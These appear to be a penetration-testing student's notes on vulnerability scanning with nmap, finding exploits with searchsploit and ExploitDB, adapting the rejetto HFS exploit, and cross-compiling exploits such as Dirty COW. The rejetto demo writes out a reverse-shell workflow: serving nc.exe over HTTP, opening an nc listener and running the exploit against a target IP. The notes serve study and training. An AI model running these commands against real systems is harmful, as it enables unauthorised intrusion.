Note: Alot of exploits are found in the other folders too so dont rely on this alone

## Intro

1. Vuln scanning
2. Exploit searching
3. Fixing exploits
4. Bind & reverse shells
5. Exploit Frameworks
6. Windows exploit
7. Linux exploit
8. AV Evasion and Obfuscation


# Vuln scanning
### banner grabbing
- can get service info

Demo:
Some nmap script
`ls -al /usr/share/nmap/scripts/ | grep banner`
`nmap -sV --script=banner <ip>` -> done in -sV

`nc <ip>` -> same stuff but sometimes nmap sV dont work

### nmap scripts
Demo:
`ls -al /usr/share/nmap/scripts |grep http` -> limit to only http scripts

See the documentation on scripts
`nano /usr/share/nmap/scripts/http-enum.nse`

For this demo
`ls -al /usr/share/nmap/scripts |grep shellshock`

`nmap -sV <ip> --script=http-shellshock --script-args="http-shellshock.url=/gettime.cgi"`

### Metasploit

demo:
/smb/smb_ms17_010


## Searching for publicly available exploits

- get code from verified sources (anyone can set a github)
- epxloitDB / Rapid7 

#### ExploitDB
- maintained by a team from kali
- search types/platforms/authors/ports/tags(type of vuln) etc

#### Rapid7
- vetted. Same as before

#### Google Dorks it
- vsftpd site:rapid7.com

#### Data storm
- Info on latest news and new exploits etc

### Searchsploit
- locally available db for exploits
`sudo apt-get update && sudo apt-get install exploitdb -y`

Should update it frequently
`searchsploit -u`

Exploits stored here
`ls -al /usr/share/exploitdb`

`searchsploit vsftpd 2.3.4`
`searchsploit -m 49757` -> get info about the exploit and copies it to ur current dir

Filters like in the exploitdb site:
`searchsploit remote windwos smb`


Xtra:
`searchsploit -t vsftpd`
-> search in title

`searchsploit -e "Windows XP" | grep -e "Microsoft Windows XP"
-> exact match

`seachsploit remote windows smb -w | grep -e "EternalBlue"`
-> -w gives the online link to read more about each exploit


### Fixing exploits
- All publicly available exploits need to be edited to suite ur needs

Demo:
rejetto
`searchsploit rejetto`
`searchsploit -m <exploit id>`

Edit the exploit code to use (eg change ip/port)
`vim <exploit.py>`
This exploit needed nc.exe to be hosted on your local server to run on the target

Attacker
`cp /usr/share/windows-resources/binaries/nc.exe`
-> Copy it to the home directory to share 
`python -m SimpleHTTPServer 80`

Attacker (another terminal)
`nc -lvnp 1234`

Attacker (3rd terminal terminal)
`python 29161.py <targetip> 80`

Run a few times.should work
`systeminfo`


### Cross-compiling exploits
- need to compile C/C++ exploit code
- Using Linux to compile windows exploits (cross-compiling)

Demo:
For creating Microsoft Windows portable executables in linux
`sudo apt-get install mingw-w64`

For C code in Linux
`sudo apt-get install gcc`

Note: Better to get the 32bit exploits more compatible

#### If no documentation of how to compile
Compiles to a 64bit executable
`i686-w64-mingw32-gcc 9303.c -o exploit`

Compiles to a 32bit executable
`i686-w64-mingw32-gcc 9303.c -o exploit -lws2_32`

#### Dirty cow exploit
- Has good documentation on how to use/compile
`gcc -pthread 4089.c -o exploit -lcrypt`

Last:
github exploitdb-bin-sploits/bin-sploits has some precompiled binaries if needed